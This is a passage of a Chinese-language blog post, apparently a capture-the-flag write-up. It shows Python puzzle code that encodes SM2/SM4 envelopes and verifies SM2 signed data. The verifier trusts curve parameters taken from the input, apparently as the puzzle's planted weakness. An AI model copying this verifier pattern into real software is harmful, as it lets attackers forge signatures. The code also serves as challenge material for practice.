univ.Integer(<span class="built_in">int</span>.from_bytes(encrypted_key[:<span class="number">32</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;yCoordinate&#x27;</span>] = univ.Integer(<span class="built_in">int</span>.from_bytes(encrypted_key[<span class="number">32</span>:<span class="number">64</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;hash&#x27;</span>] = univ.OctetString(encrypted_key[<span class="number">64</span>:<span class="number">96</span>])</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>] = univ.OctetString(encrypted_key[<span class="number">96</span>:])</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;digest&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(digest))</span><br><span class="line">    <span class="keyword">return</span> encode(envelope).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从asn1格式的16进制字符串提取参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asn1_parse</span>(<span class="params">asn1_hex_str:<span class="built_in">str</span>,asn1_spec</span>):</span><br><span class="line">    <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">    der_bytes = binascii.unhexlify(asn1_hex_str)</span><br><span class="line">    <span class="comment"># 解码为ASN.1对象</span></span><br><span class="line">    enveloped_data, _ = decode(der_bytes, asn1Spec=asn1_spec)</span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    sm2_x = <span class="built_in">hex</span>(<span class="built_in">int</span>(enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;xCoordinate&#x27;</span>]))[<span class="number">2</span>:]</span><br><span class="line">    sm2_y = <span class="built_in">hex</span>(<span class="built_in">int</span>(enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;yCoordinate&#x27;</span>]))[<span class="number">2</span>:]</span><br><span class="line">    sm2_hash = enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;hash&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line">    sm2_ciphertext = enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm4</span></span><br><span class="line">    sm4_algorithm = <span class="built_in">str</span>(enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;algorithm&#x27;</span>])</span><br><span class="line">    sm4_iv = enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;iv&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line">    sm4_cipherText = enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm3</span></span><br><span class="line">    digestAlgorithm = <span class="built_in">str</span>(enveloped_data[<span class="string">&#x27;digestAlgorithm&#x27;</span>])</span><br><span class="line">    digest = enveloped_data[<span class="string">&#x27;digest&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出提取的值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;asn1格式的16进制字符串:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  asn1: <span class="subst">&#123;asn1_hex_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM2参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  xCoordinate: <span class="subst">&#123;sm2_x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  yCoordinate: <span class="subst">&#123;sm2_y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  hash: <span class="subst">&#123;sm2_hash&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  cipherText: <span class="subst">&#123;sm2_ciphertext&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM4参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  algorithm: <span class="subst">&#123;sm4_algorithm&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  iv: <span class="subst">&#123;sm4_iv&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  cipherText: <span class="subst">&#123;sm4_cipherText&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM3参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  digestAlgorithm: <span class="subst">&#123;digestAlgorithm&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  digest: <span class="subst">&#123;digest&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plaintext = <span class="string">&quotquot;</span></span><br><span class="line">    sm2_key = <span class="string">&quot;044f66804d1d30f4499377b96dc8e18faab8300ebddf3eb0fa2065214c260d64c08c6dfe7d9923d6d5baa3a0512a2ede03357c723230ebf77906f82dc1b0fccc1e&quot;</span></span><br><span class="line">    iv = <span class="string">&quot;43d4192f9f74e90543d4192f9f74e905&quot;</span></span><br><span class="line">    asn1_hex_str = sm4_encrypt(<span class="built_in">bytes</span>.fromhex(plaintext).decode(<span class="string">&#x27;utf-8&#x27;</span>),sm2_key,iv)</span><br><span class="line">    asn1_parse(asn1_hex_str,EnvelopedData())</span><br></pre></td></tr></table></figure><h2 id="初始谜题2"><a class="markdownIt-Anchor" href="#初始谜题2"></a> 初始谜题2*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sm2_verify.py</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> univ, namedtype</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.encoder <span class="keyword">import</span> encode</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.decoder <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm2</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der <span class="keyword">import</span> decoder, encoder</span><br><span class="line"><span class="keyword">from</span> pyasn1_modules <span class="keyword">import</span> rfc2459</span><br><span class="line"><span class="keyword">from</span> gmssl.sm2 <span class="keyword">import</span> CryptSM2</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span>.useful <span class="keyword">import</span> GeneralizedTime</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span>.univ <span class="keyword">import</span> <span class="type">Sequence</span></span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> useful</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECPrimeFieldConfig</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;fieldType&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.840.10045.1.1&#x27;</span>)),  <span class="comment"># Prime field OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;prime&#x27;</span>, univ.Integer()),  <span class="comment"># Prime number p</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECCurveParameters</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;coefficientA&#x27;</span>, univ.OctetString()),  <span class="comment"># Curve coefficient a</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;coefficientB&#x27;</span>, univ.OctetString()),  <span class="comment"># Curve coefficient b</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDomainParameters</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;version&#x27;</span>, univ.Integer(<span class="number">1</span>)),  <span class="comment"># Version number (1)</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;fieldParameters&#x27;</span>, ECPrimeFieldConfig()),  <span class="comment"># Field parameters 包含参数oid，p</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;curveParameters&#x27;</span>, ECCurveParameters()),  <span class="comment"># Curve parameters 包含参数a，b</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;basePoint&#x27;</span>, univ.OctetString()),  <span class="comment"># Base point G 基点</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;order&#x27;</span>, univ.Integer()),  <span class="comment"># Order n of base point 参数n</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cofactor&#x27;</span>, univ.Integer(<span class="number">1</span>)),  <span class="comment"># Cofactor 余因子 固定值为1</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2SignatureValue</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;r&#x27;</span>, univ.Integer()),  <span class="comment"># First part of signature</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;s&#x27;</span>, univ.Integer()),  <span class="comment"># Second part of signature</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2SignedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        <span class="comment"># version</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;version&#x27;</span>, univ.Integer()),</span><br><span class="line">        <span class="comment"># 哈希算法 OID（SM3）</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digestAlgorithms&#x27;</span>, univ.ObjectIdentifier()),</span><br><span class="line">        <span class="comment"># 签名值 r, s</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;sm2Signature&#x27;</span>, SM2SignatureValue()),</span><br><span class="line">        <span class="comment"># 曲线参数</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;ecDomainParameters&#x27;</span>, ECDomainParameters()),</span><br><span class="line">        <span class="comment"># 证书</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;certificate&#x27;</span>, univ.OctetString()),</span><br><span class="line">        <span class="comment"># 签名时间</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;timestamp&#x27;</span>, GeneralizedTime()),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入值全部为16进制字符串,g为x，y坐标的16进制字符串进行拼接</span></span><br><span class="line"><span class="comment"># p,a,b,n,g对应曲线参数;r,s为签名值的两部分</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asn1_package</span>(<span class="params">version, oid, signature, curve_params, cert_hex, time_stamp</span>):</span><br><span class="line">    sm2_signed_data = SM2SignedData()</span><br><span class="line">    <span class="comment"># version</span></span><br><span class="line">    sm2_signed_data[<span class="string">&#x27;version&#x27;</span>] = version</span><br><span class="line">    <span class="comment"># 哈希算法 OID（SM3）</span></span><br><span class="line">    sm2_signed_data[<span class="string">&#x27;digestAlgorithms&#x27;</span>] = oid</span><br><span class="line">    <span class="comment"># 签名值 r, s</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>] = SM2SignatureValue()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>][<span class="string">&#x27;r&#x27;</span>] = <span class="built_in">int</span>(signature[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>][<span class="string">&#x27;s&#x27;</span>] = <span class="built_in">int</span>(signature[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 曲线参数</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>] = ECDomainParameters()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;fieldParameters&quot;</span>] = ECPrimeFieldConfig()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;fieldParameters&quot;</span>][<span class="string">&quot;prime&quot;</span>] = <span class="built_in">int</span>(curve_params[<span class="string">&#x27;p&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>] = ECCurveParameters()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>][<span class="string">&quot;coefficientA&quot;</span>] = univ.OctetString(</span><br><span class="line">        <span class="built_in">bytes</span>.fromhex(curve_params[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>][<span class="string">&quot;coefficientB&quot;</span>] = univ.OctetString(</span><br><span class="line">        <span class="built_in">bytes</span>.fromhex(curve_params[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&#x27;basePoint&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;04&#x27;</span> + curve_params[<span class="string">&#x27;g&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&#x27;order&#x27;</span>] = <span class="built_in">int</span>(curve_params[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 证书</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;certificate&quot;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(cert_hex))</span><br><span class="line">    <span class="comment"># 时间</span></span><br><span class="line">    dt = datetime.strptime(time_stamp, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    asn1_time_str = dt.strftime(<span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;timestamp&quot;</span>] = GeneralizedTime(asn1_time_str)</span><br><span class="line">    <span class="keyword">return</span> encode(sm2_signed_data).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sm2CertVerifier</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cert_hex: <span class="built_in">str</span></span>):</span><br><span class="line">        ca_pubkey = <span class="string">&quot;8E1860588D9900C16BD19A0FE0A5ACC600224DBD794FFD34179E03698D52421F46E6D8C6E8AADE512C7B543395AC39C76384726C7F8BA537ABCA0C129ECD9882&quot;</span></span><br><span class="line">        self.sm2_crypt = sm2.CryptSM2(public_key=ca_pubkey, private_key=<span class="literal">None</span>)</span><br><span class="line">        self.cert_tbs, self.signature_bytes, self.cert = self.parse_cert(<span class="built_in">bytes</span>.fromhex(cert_hex))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_cert</span>(<span class="params">cert_der_bytes: <span class="built_in">bytes</span></span>):</span><br><span class="line">        cert, _ = decoder.decode(cert_der_bytes, asn1Spec=rfc2459.Certificate())</span><br><span class="line">        tbs = cert.getComponentByName(<span class="string">&#x27;tbsCertificate&#x27;</span>)</span><br><span class="line">        signature_bytes = cert.getComponentByName(<span class="string">&#x27;signatureValue&#x27;</span>).asOctets()</span><br><span class="line">        <span class="keyword">return</span> tbs, signature_bytes, cert</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取签名值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_rs_from_der</span>(<span class="params">self, signature: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        seq, _ = decode(signature, asn1Spec=<span class="type">Sequence</span>())</span><br><span class="line">        r = <span class="built_in">int</span>(seq[<span class="number">0</span>])</span><br><span class="line">        s = <span class="built_in">int</span>(seq[<span class="number">1</span>])</span><br><span class="line">        r_bytes = r.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        s_bytes = s.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> r_bytes + s_bytes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">self, signature: <span class="built_in">bytes</span>, tbs: <span class="built_in">str</span></span>):</span><br><span class="line">        inter_cert_tbs_der = encoder.encode(tbs)</span><br><span class="line">        inter_signature = self.decode_rs_from_der(signature)</span><br><span class="line">        <span class="comment"># 验证签名（tbs_der必须完整，签名必须64字节）</span></span><br><span class="line">        <span class="keyword">return</span> self.sm2_crypt.verify_with_sm3(inter_signature.<span class="built_in">hex</span>(), inter_cert_tbs_der)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_certificate_expiration_date</span>(<span class="params">self, tbs</span>):</span><br><span class="line">        validity = tbs.getComponentByName(<span class="string">&#x27;validity&#x27;</span>)</span><br><span class="line">        not_before = validity.getComponentByName(<span class="string">&#x27;notBefore&#x27;</span>).getComponent()</span><br><span class="line">        not_after = validity.getComponentByName(<span class="string">&#x27;notAfter&#x27;</span>).getComponent()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理 UTCTime 和 GeneralizedTime 两种类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(not_before, useful.UTCTime):</span><br><span class="line">            not_before_time = datetime.strptime(<span class="built_in">str</span>(not_before), <span class="string">&quot;%y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(not_before, useful.GeneralizedTime):</span><br><span class="line">            not_before_time = datetime.strptime(<span class="built_in">str</span>(not_before), <span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported notBefore time format&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(not_after, useful.UTCTime):</span><br><span class="line">            not_after_time = datetime.strptime(<span class="built_in">str</span>(not_after), <span class="string">&quot;%y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(not_after, useful.GeneralizedTime):</span><br><span class="line">            not_after_time = datetime.strptime(<span class="built_in">str</span>(not_after), <span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported notAfter time format&quot;</span>)</span><br><span class="line"></span><br><span class="line">        now = datetime.now()</span><br><span class="line">        <span class="keyword">return</span> not_before_time &lt;= now &lt;= not_after_time</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 验证中间证书有效期</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.verify_certificate_expiration_date(self.cert_tbs):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;证书已过期或尚未生效&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 验证中间证书签名</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.verify_signature(self.signature_bytes, self.cert_tbs):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;证书验证未通过&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2Config</span>:</span><br><span class="line">    <span class="comment"># sm2参数初始化</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, asn1_str</span>):</span><br><span class="line">        self.sm2_signed_data,asn1_acess = self.hex_to_asn1(asn1_str, SM2SignedData())</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(asn1_acess) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;asn1长度有问题&quot;</span>)</span><br><span class="line">        cert_hex = self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;certificate&#x27;</span>])</span><br><span class="line">        sm2_cert_verifier = Sm2CertVerifier(cert_hex)</span><br><span class="line">        valid = sm2_cert_verifier.verify()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;证书验证不通过&quot;</span>)</span><br><span class="line">        g = self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;basePoint&#x27;</span>])</span><br><span class="line">        g = g[<span class="number">2</span>:] <span class="keyword">if</span> g.startswith(<span class="string">&quot;04&quot;</span>) <span class="keyword">else</span> g</span><br><span class="line">        self.ecc_table = &#123;</span><br><span class="line">            <span class="string">&#x27;n&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;p&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;fieldParameters&#x27;</span>][<span class="string">&#x27;prime&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;g&#x27;</span>: g,</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;curveParameters&#x27;</span>][<span class="string">&#x27;coefficientA&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;b&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;curveParameters&#x27;</span>][<span class="string">&#x27;coefficientB&#x27;</span>]),</span><br><span class="line">        &#125;</span><br><span class="line">        public_key = self.extract_public_key(sm2_cert_verifier.cert_tbs)</span><br><span class="line">        self.sm2_crypt = CryptSM2(</span><br><span class="line">            private_key=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            public_key=public_key,</span><br><span class="line">            ecc_table=self.ecc_table</span><br><span class="line">        )</span><br><span class="line">        self.sign = (<span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;sm2Signature&#x27;</span>][<span class="string">&#x27;r&#x27;</span>]).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().upper() +</span><br><span class="line">                     <span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;sm2Signature&#x27;</span>][<span class="string">&#x27;s&#x27;</span>]).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().upper())</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hex_to_asn1</span>(<span class="params">hex_str, asn1_spec</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将16进制字符串转换回ASN.1对象</span></span><br><span class="line"><span class="string">        :param hex_str: 16进制字符串</span></span><br><span class="line"><span class="string">        :param asn1_spec: ASN.1结构定义</span></span><br><span class="line"><span class="string">        :return: ASN.1对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">        der_bytes = binascii.unhexlify(hex_str)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解码为ASN.1对象</span></span><br><span class="line">        asn1_object, excess = decode(der_bytes, asn1Spec=asn1_spec)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> asn1_object,excess</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_hex_value</span>(<span class="params">value</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;通用转换函数：将 ASN.1 值转换为 16 进制字符串（大写，无前缀）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, univ.Integer):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">format</span>(<span class="built_in">int</span>(value), <span class="string">&#x27;X&#x27;</span>)  <span class="comment"># Integer -&gt; 直接转十六进制</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, univ.OctetString):</span><br><span class="line">            <span class="keyword">return</span> value.asOctets().<span class="built_in">hex</span>().upper()  <span class="comment"># OctetString -&gt; 字节转十六进制</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unsupported type: <span class="subst">&#123;<span class="built_in">type</span>(value)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_public_key</span>(<span class="params">tbs</span>):</span><br><span class="line">        spki = tbs.getComponentByName(<span class="string">&#x27;subjectPublicKeyInfo&#x27;</span>)</span><br><span class="line">        public_key_bitstring = spki.getComponentByName(<span class="string">&#x27;subjectPublicKey&#x27;</span>)</span><br><span class="line">        <span class="comment"># 提取位串内容（包含开头的 0x04）</span></span><br><span class="line">        pubkey_bytes = <span class="built_in">bytearray</span>(public_key_bitstring.asOctets())</span><br><span class="line">        <span class="comment"># 转成十六进制字符串</span></span><br><span class="line">        <span class="keyword">return</span> pubkey_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_misc</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;version&#x27;</span>]) != <span class="number">1</span> <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">str</span>(self.sm2_signed_data[<span class="string">&#x27;digestAlgorithms&#x27;</span>]) != <span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span> <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">str</span>(self.sm2_signed_data[<span class="string">&#x27;timestamp&#x27;</span>]) != <span class="string">&quot;20250520101000Z&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm2验签</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, data</span>):</span><br><span class="line">        valid = self.verify_misc()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">return</span> valid</span><br><span class="line">        valid = self.sm2_crypt.verify_with_sm3(self.sign, data)</span><br><span class="line">        <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过该函数可以产生一个合法的SM2SignedData</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateSM2SignedDataExample</span>():</span><br><span class="line">    <span class="comment"># 版本</span></span><br><span class="line">    version = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 哈希算法oid</span></span><br><span class="line">    oid = <span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span></span><br><span class="line">    <span class="comment"># 签名值r, s</span></span><br><span class="line">    signature = <span class="string">&#x27;6f8eaff551d0f3fa6de74b75b33e1e58f9fdb4dc58e61c82e11e717ffcf168c4db3d5a90ff3625d12b8b658f8dbab34340c278b412b3aff25489e7feb1c75598&#x27;</span></span><br><span class="line">    r = signature[:<span class="number">64</span>]</span><br><span class="line">    s = signature[<span class="number">64</span>:]</span><br><span class="line">    <span class="comment"># 曲线参数</span></span><br><span class="line">    curve_params = &#123;</span><br><span class="line">        <span class="string">&quot;n&quot;</span>: <span 